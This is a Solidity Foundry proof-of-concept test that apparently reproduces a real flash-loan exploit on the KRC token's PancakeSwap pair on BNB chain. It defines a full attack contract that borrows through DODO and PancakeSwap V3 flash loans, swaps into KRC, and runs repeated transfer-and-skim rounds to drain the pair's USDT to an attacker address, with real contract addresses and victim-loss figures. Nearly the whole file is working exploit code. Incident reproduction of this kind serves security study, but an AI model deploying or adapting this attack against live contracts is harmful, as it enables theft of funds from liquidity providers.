
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 49875423;
    uint256 constant TX_TIMESTAMP = 1747556507;
    uint256 constant TX_BLOCK_NUMBER = 49875424;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        KrcAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
        _assertEcon();
    }

    function _deployAttack() internal returns (KrcAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = KrcAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new KrcAttack();
        }
    }

    function _prepareProfit(KrcAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _executeAttack(KrcAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(KrcAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDT, "USDT", 7154807872520012958697);
        _expectProfit(Addresses.attack_contract, attack, Addresses.KRC, "KRC", 1866345334850949900);
        economicOracles.push(
            EconomicOracle(
                Addresses.Cake_LP, Addresses.KRC, "KRC", "victim_loss", false, 952786269477665760591, false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.Cake_LP, Addresses.USDT, "USDT", "victim_loss", false, 7204807872520012958697, false
            )
        );
    }
}

contract KrcAttack {
    bytes4 private constant ENTRYPOINT = bytes4(0xc7f99e96);

    function attack() external payable {
        executeDppFlash();
    }

    function flashCallback() internal {
        dppCallbackDone = true;
        startPancakeV3Flash();
        repayDppFlash();
    }

    function flashCallback2() internal {
        v3CallbackDone = true;
        approveRouter();
        swapInitialUsdt();
        swapRemainingUsdt();
        drainKrcWithSkims();
        extractPairUsdt();
        repayPancakeV3();
    }

    function executeDppFlash() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.DPP);
        IDPP(Addresses.DPP).flashLoan(0, dppBorrowAmount(), address(this), dppFlashData());
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        collectUsdtProfit();
    }

    function startPancakeV3Flash() internal {
        IPancakeV3Pool(Addresses.PancakeV3Pool).flash(address(this), v3BorrowAmount(), 0, hex"");
    }

    function repayDppFlash() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.DPP, dppBorrowAmount());
    }

    function approveRouter() internal {
        IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP);
    }

    function swapInitialUsdt() internal {
        swapUsdtForKrc(144116157450400259173940);
    }

    function swapRemainingUsdt() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        swapUsdtForKrc(204040969184595153079754);
    }

    function swapUsdtForKrc(uint256 swapAmountIn) internal {
        if (swapAmountIn == 0) return;
        if (IERC20Like(Addresses.USDT).allowance(address(this), Addresses.PancakeRouter) < swapAmountIn) {
            IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
        }
        IPancakeRouter(Addresses.PancakeRouter)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                swapAmountIn, 0, usdtKrcPath(), address(this), TX_DEADLINE
            );
    }

    function drainKrcWithSkims() internal {
        uint256[16] memory skimAmounts = [
            uint256(26158607120271760914),
            23542746408244584823,
            21188471767420126341,
            19069624590678113707,
            17162662131610302337,
            15446395918449272104,
            13901756326604344894,
            12511580693943910405,
            11260422624549519365,
            10134380362094567429,
            9120942325885110687,
            8208848093296599619,
            7387963283966939658,
            6649166955570245693,
            5984250260013221124,
            5385825234011899012
        ];

        IERC20Like(Addresses.KRC).balanceOf(address(this));
        transferKrcToPair(skimAmounts[0]);
        skimPair();

        for (uint256 i = 1; i < skimAmounts.length; i++) {
            IERC20Like(Addresses.KRC).balanceOf(address(this));
            IERC20Like(Addresses.KRC).balanceOf(Addresses.Cake_LP);
            IERC20Like(Addresses.KRC).balanceOf(address(this));
            transferKrcToPair(skimAmounts[i]);
            skimPair();
        }
    }

    function extractPairUsdt() internal {
        IERC20Like(Addresses.KRC).balanceOf(address(this));
        IERC20Like(Addresses.KRC).balanceOf(Addresses.Cake_LP);
        IERC20Like(Addresses.KRC).balanceOf(Addresses.Cake_LP);
        transferKrcToPair(2980897375759759211);
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP);
        IPancakePair(Addresses.Cake_LP).swap(0, 355361934507515425212391, address(this), hex"");
    }

    function repayPancakeV3() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool, 100050000000000000000000);
    }

    function collectUsdtProfit() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, 7154807872520012958697);
    }

    function transferKrcToPair(uint256 amount) internal {
        IERC20Like(Addresses.KRC).transfer(Addresses.Cake_LP, amount);
    }

    function skimPair() internal {
        IPancakePair(Addresses.Cake_LP).skim(address(this));
    }

    function dppBorrowAmount() internal pure returns (uint256) {
        return 248157126634995412253694;
    }

    function v3BorrowAmount() internal pure returns (uint256) {
        return 100000000000000000000000;
    }

    function dppFlashData() internal pure returns (bytes memory) {
        return hex"0000000000000000000000000000000000000000000000000000000000000000";
    }

    function usdtKrcPath() internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = Addresses.USDT;
        path[1] = Addresses.KRC;
    }

    receive() external payable {}

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata callbackData)
        external
        payable
    {
        sender;
        baseAmount;
        quoteAmount;
        callbackData;
        if (!dppCallbackDone) flashCallback();
        return;
    }

    function pancakeV3FlashCallback(uint256 feeAmount0, uint256 feeAmount1, bytes calldata callbackData)
        external
        payable
    {
        feeAmount0;
        feeAmount1;
        callbackData;
        if (!v3CallbackDone) flashCallback2();
        return;
    }

    fallback() external payable {
        if (msg.sig == ENTRYPOINT) {

            executeDppFlash();
            return;
        }
    }

    uint256 private constant TX_DEADLINE = 1747556507;
    bool private dppCallbackDone;
    bool private v3CallbackDone;
}

library Addresses {
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant KRC = 0x1814a8443F37dDd7930A9d8BC4b48353FE589b58;
    address internal constant PancakeV3Pool = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant DPP = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    address internal constant attacker_eoa = 0x9943F26831F9b468A7FE5Ac531C352BAab8af655;
    address internal constant attack_contract = 0xD995eDCAB2Efe3283514FF111cEdc9aaFf0349c8;
    address internal constant Cake_LP = 0xdBEAD75d3610209A093AF1D46d5296BBeFFd53f5;
}

interface IPancakePair {
    function skim(address) external;
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IDPP {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
}

interface IPancakeV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
}
